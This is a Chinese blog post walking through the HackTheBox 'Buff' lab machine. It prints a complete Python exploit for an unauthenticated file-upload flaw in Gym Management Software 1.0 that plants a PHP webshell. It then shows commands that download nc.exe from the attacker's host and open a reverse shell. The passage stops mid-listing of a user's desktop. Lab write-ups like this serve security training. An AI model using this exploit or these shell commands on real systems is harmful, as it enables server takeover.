<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.0.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/images/01.jpg"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="h6ecMlAUCMDTIJmEha3N3mJmMydid5XY8AbS767rKtM"><meta name="baidu-site-verification" content="T0YB7GSdOB"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><script class="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"lunamoore.github.io",root:"/",scheme:"Muse",version:"8.0.0-rc.5",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12},copycode:!0,bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"fadeInDown",post_body:"fadeInDown",coll_header:"fadeInLeft",sidebar:"fadeInUp"}},prism:!1,path:"search.xml",localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1}}</script><meta name="description" content="0x00.简述"><meta property="og:type" content="article"><meta property="og:title" content="HTB-[buff]"><meta property="og:url" content="https://lunamoore.github.io/2020/09/01/HTB-buff/index.html"><meta property="og:site_name" content="Lluna&#39;s Pure land."><meta property="og:description" content="0x00.简述"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lunamoore.github.io/2020/09/01/HTB-buff/image-20200905172118673.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/01/HTB-buff/image-20200901144251166.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/01/HTB-buff/image-20200901153655031.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/01/HTB-buff/image-20200901200724402.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/01/HTB-buff/image-20200901155912608.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/01/HTB-buff/image-20200901163645906.png"><meta property="article:published_time" content="2020-09-01T14:55:09.000Z"><meta property="article:modified_time" content="2020-09-05T09:21:58.011Z"><meta property="article:author" content="Lluna"><meta property="article:tag" content="靶机"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lunamoore.github.io/2020/09/01/HTB-buff/image-20200905172118673.png"><link rel="canonical" href="https://lunamoore.github.io/2020/09/01/HTB-buff/"><script class="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>HTB-[buff] | Lluna's Pure land.</title><noscript><style>body{margin-top:2rem}.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header,.use-motion .sidebar{visibility:visible}.use-motion .footer,.use-motion .header,.use-motion .site-brand-container .toggle{opacity:initial}.use-motion .custom-logo-image,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line{transform:scaleX(1)}.search-pop-overlay,.sidebar-nav{display:none}.sidebar-panel{display:block}</style></noscript><link rel="alternate" href="/atom.xml" title="Lluna's Pure land." type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><h1 class="site-title">Lluna's Pure land.</h1><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">What is life like when singing to wine?</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home // 首页 fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user // 关于 fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags // 标签 fa-fw"></i>标签<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th // 分类 fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive // 归档 fa-fw"></i>归档<span class="badge">51</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container"><div class="no-result"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><section class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x00.简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">0x01.信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%AE%BF%E9%97%AE8080"><span class="nav-number">3.</span> <span class="nav-text">0x02.访问8080</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%9F%A5%E6%89%BEexp%EF%BC%8C%E5%AD%98%E5%9C%A8RCE"><span class="nav-number">4.</span> <span class="nav-text">0x03.查找exp，存在RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-exploit"><span class="nav-number">5.</span> <span class="nav-text">0x04.exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E9%AA%8C%E8%AF%81"><span class="nav-number">6.</span> <span class="nav-text">0x05.验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.</span> <span class="nav-text">0x06.反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E6%8F%90%E6%9D%83"><span class="nav-number">8.</span> <span class="nav-text">0x07.提权</span></a></li></ol></div></section><section class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Lluna" src="/images/01.jpg"><p class="site-author-name" itemprop="name">Lluna</p><div class="site-description" itemprop="description">A primary school student in the field of Cyberspace Security!</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">51</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">12</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lunamoore"><i class="fab fa-github fa-fw"></i></span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmppeWViYWxhYmFsYUAxMjYuY29t" title="E-Mail → mailto:jiyebalabala@126.com"><i class="fa fa-envelope fa-fw"></i></span></span></div><div class="cc-license animated" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div><div class="links-of-blogroll animated"><div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i> 友链</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly92YWxlY2FzZWMuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;valecasec.github.io">valecalida's house</span></li></ul></div></section></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZS8=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunamoore.github.io/2020/09/01/HTB-buff/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/01.jpg"><meta itemprop="name" content="Lluna"><meta itemprop="description" content="A primary school student in the field of Cyberspace Security!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lluna's Pure land."></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HTB-[buff]</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-09-01 22:55:09" itemprop="dateCreated datePublished" datetime="2020-09-01T22:55:09+08:00">2020-09-01</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-09-05 17:21:58" itemprop="dateModified" datetime="2020-09-05T17:21:58+08:00">2020-09-05</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a> </span></span><span id="/2020/09/01/HTB-buff/" class="post-meta-item leancloud_visitors" data-flag-title="HTB-[buff]" title="阅读次数"><span class="post-meta-item-icon"><i class="far fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/09/01/HTB-buff/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/09/01/HTB-buff/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>18k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>16 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2020/09/01/HTB-buff/image-20200905172118673.png"> <a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>开放了8080端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nmap -sC -sV -sT 10.10.10.198 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 02:33 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.198</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">|_http-title: mrb3n<span class="string">&#x27;s Bro Hut</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 60.65 seconds</span></span><br><span class="line"><span class="string">root@JIYE:~/htb/buff# </span></span><br></pre></td></tr></table></figure><h2 id="0x02-访问8080"><a href="#0x02-访问8080" class="headerlink" title="0x02.访问8080"></a>0x02.访问8080</h2><p><code>手动爬虫发现使用了Gym Management Software 1.0</code></p><img src="/2020/09/01/HTB-buff/image-20200901144251166.png"><h2 id="0x03-查找exp，存在RCE"><a href="#0x03-查找exp，存在RCE" class="headerlink" title="0x03.查找exp，存在RCE"></a>0x03.查找exp，存在RCE</h2><p><code>利用详情</code></p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDg1MDY=">exp url<i class="fa fa-external-link-alt"></i></span></p><p>1.访问“ /upload.php”页面，因为它不检查经过身份验证的用户会话。</p><p>2.将GET请求的’id’参数设置为所上传的PHP文件所需的文件名。</p><p>3.通过添加两个扩展绕过扩展白名单，最后一个作为可接受的扩展（PNG）。</p><p>4.通过在POST请求中将’file’参数的’Content-Type’修改为’image / png’来绕过文件类型检查，并将’pupload’参数设置为’upload’。</p><p>5.在POST请求的“file”参数的主体中，插入恶意的PHP代码：</p> <?php echo shell_exec($_GET["telepathy"]); ?> <p>6.Web应用程序将对文件进行重命名，使其具有从文件名称创建的数组中的第二个扩展项;由’.’字符分开。</p><p>7.使用带有telepathy参数的GET请求，与位于’/upload.php?id=kamehameha’的webshell进行通信。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import requests, sys, urllib, re</span><br><span class="line">from colorama import Fore, Back, Style</span><br><span class="line">requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">def webshell(SERVER_URL, session):</span><br><span class="line">    try:</span><br><span class="line">        WEB_SHELL = SERVER_URL+<span class="string">&#x27;upload/kamehameha.php&#x27;</span></span><br><span class="line">        getdir  = &#123;<span class="string">&#x27;telepathy&#x27;</span>: <span class="string">&#x27;echo %CD%&#x27;</span>&#125;</span><br><span class="line">        r2 = session.get(WEB_SHELL, params=getdir, verify=False)</span><br><span class="line">        status = r2.status_code</span><br><span class="line">        <span class="keyword">if</span> status != 200:</span><br><span class="line">            <span class="built_in">print</span> Style.BRIGHT+Fore.RED+<span class="string">&quot;[!] &quot;</span>+Fore.RESET+<span class="string">&quot;Could not connect to the webshell.&quot;</span>+Style.RESET_ALL</span><br><span class="line">            r2.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(Fore.GREEN+<span class="string">&#x27;[+] &#x27;</span>+Fore.RESET+<span class="string">&#x27;Successfully connected to webshell.&#x27;</span>)</span><br><span class="line">        cwd = re.findall(<span class="string">&#x27;[CDEF].*&#x27;</span>, r2.text)</span><br><span class="line">        cwd = cwd[0]+<span class="string">&quot;&gt; &quot;</span></span><br><span class="line">        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            thought = raw_input(term)</span><br><span class="line">            <span class="built_in">command</span> = &#123;<span class="string">&#x27;telepathy&#x27;</span>: thought&#125;</span><br><span class="line">            r2 = requests.get(WEB_SHELL, params=<span class="built_in">command</span>, verify=False)</span><br><span class="line">            status = r2.status_code</span><br><span class="line">            <span class="keyword">if</span> status != 200:</span><br><span class="line">                r2.raise_for_status()</span><br><span class="line">            response2 = r2.text</span><br><span class="line">            <span class="built_in">print</span>(response2)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\r\nExiting.&quot;</span>)</span><br><span class="line">        sys.exit(-1)</span><br><span class="line"></span><br><span class="line">def formatHelp(STRING):</span><br><span class="line">    <span class="built_in">return</span> Style.BRIGHT+Fore.RED+STRING+Fore.RESET</span><br><span class="line"></span><br><span class="line">def header():</span><br><span class="line">    BL   = Style.BRIGHT+Fore.GREEN</span><br><span class="line">    RS   = Style.RESET_ALL</span><br><span class="line">    FR   = Fore.RESET</span><br><span class="line">    SIG  = BL+<span class="string">&#x27;            /\\\n&#x27;</span>+RS</span><br><span class="line">    SIG += Fore.YELLOW+<span class="string">&#x27;/vvvvvvvvvvvv &#x27;</span>+BL+<span class="string">&#x27;\\&#x27;</span>+FR+<span class="string">&#x27;--------------------------------------,\n&#x27;</span></span><br><span class="line">    SIG += Fore.YELLOW+<span class="string">&#x27;`^^^^^^^^^^^^&#x27;</span>+BL+<span class="string">&#x27; /&#x27;</span>+FR+<span class="string">&#x27;============&#x27;</span>+Fore.RED+<span class="string">&#x27;BOKU&#x27;</span>+FR+<span class="string">&#x27;=====================&quot;\n&#x27;</span></span><br><span class="line">    SIG += BL+<span class="string">&#x27;            \/&#x27;</span>+RS+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="built_in">return</span> SIG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> header();</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="built_in">print</span> formatHelp(<span class="string">&quot;(+) Usage:\t python %s &lt;WEBAPP_URL&gt;&quot;</span> % sys.argv[0])</span><br><span class="line">        <span class="built_in">print</span> formatHelp(<span class="string">&quot;(+) Example:\t python %s &#x27;https://10.0.0.3:443/gym/&#x27;&quot;</span> % sys.argv[0])</span><br><span class="line">        sys.exit(-1)</span><br><span class="line">    SERVER_URL = sys.argv[1]</span><br><span class="line">    UPLOAD_DIR = <span class="string">&#x27;upload.php?id=kamehameha&#x27;</span></span><br><span class="line">    UPLOAD_URL = SERVER_URL + UPLOAD_DIR</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.get(SERVER_URL, verify=False)</span><br><span class="line">    PNG_magicBytes = <span class="string">&#x27;\x89\x50\x4e\x47\x0d\x0a\x1a&#x27;</span></span><br><span class="line">    png     = &#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>: </span><br><span class="line">                  (</span><br><span class="line">                    <span class="string">&#x27;kaio-ken.php.png&#x27;</span>, </span><br><span class="line">                    PNG_magicBytes+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;&lt;?php echo shell_exec($_GET[&quot;telepathy&quot;]); ?&gt;&#x27;</span>, </span><br><span class="line">                    <span class="string">&#x27;image/png&#x27;</span>, </span><br><span class="line">                    &#123;<span class="string">&#x27;Content-Disposition&#x27;</span>: <span class="string">&#x27;form-data&#x27;</span>&#125;</span><br><span class="line">                  ) </span><br><span class="line">              &#125;</span><br><span class="line">    fdata   = &#123;<span class="string">&#x27;pupload&#x27;</span>: <span class="string">&#x27;upload&#x27;</span>&#125;</span><br><span class="line">    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)</span><br><span class="line">    webshell(SERVER_URL, s)</span><br></pre></td></tr></table></figure><h2 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04.exploit"></a>0x04.exploit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python2 gymrce.py http://10.10.10.198:8080/</span></span><br><span class="line">            /\</span><br><span class="line">/vvvvvvvvvvvv \--------------------------------------,</span><br><span class="line">`^^^^^^^^^^^^ /============BOKU=====================<span class="string">&quot;</span></span><br><span class="line"><span class="string">            \/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Successfully connected to webshell.</span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt; </span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt; whoami</span></span><br><span class="line"><span class="string">�PNG</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buff\shaun</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-验证"><a href="#0x05-验证" class="headerlink" title="0x05.验证"></a>0x05.验证</h2><blockquote><p>利用完成就可以使用带有telepathy参数的GET请求，与位于’/upload.php?id=kamehameha’的webshell进行通信。</p></blockquote><img src="/2020/09/01/HTB-buff/image-20200901153655031.png"><h2 id="0x06-反弹shell"><a href="#0x06-反弹shell" class="headerlink" title="0x06.反弹shell"></a>0x06.反弹shell</h2><p><code>上传nc.exe</code></p><blockquote><p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9Y3VybA==">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl<i class="fa fa-external-link-alt"></i></span> -O <span class="exturl" data-url="aHR0cDovLzEwLjEwLjE3LjIxNi9uYy5leGU=">http://10.10.17.216/nc.exe<i class="fa fa-external-link-alt"></i></span></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># cp /usr/share/windows-binaries/nc.exe ./htb/buff/</span></span><br><span class="line">root@JIYE:~<span class="comment"># cd htb/buff/</span></span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># ls</span></span><br><span class="line">gymrce.py  nc.exe  nmap.CVT</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/09/01/HTB-buff/image-20200901200724402.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.198 - - [01/Sep/2020 03:53:36] <span class="string">&quot;GET /nc.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kali监听</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>反弹</code></p><blockquote><p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9bmM=">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc<i class="fa fa-external-link-alt"></i></span> -e cmd.exe 10.10.17.216 6666</p></blockquote><img src="/2020/09/01/HTB-buff/image-20200901155912608.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.198] 51130</span><br><span class="line">Microsoft Windows [Version 10.0.17134.1610]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">buff\shaun</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;<span class="built_in">cd</span>\</span><br></pre></td></tr></table></figure><p><code>找到user.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\shaun\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\shaun\Desktop</span><br><span 